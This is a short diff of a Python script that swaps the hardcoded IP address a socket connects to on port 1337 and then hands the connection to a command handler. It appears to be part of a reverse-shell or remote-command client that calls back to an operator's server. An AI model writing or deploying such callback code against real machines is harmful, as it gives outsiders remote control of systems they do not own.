@@ -134,7 +134,7 @@ def main():
 		s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
 		s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
 		s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)
-		s.connect(('68.183.129.230',1337))#Change your server ip and port
+		s.connect(('142.93.198.160',1337))#Change your server ip and port
 
 		cmdHandle(s, p)
 
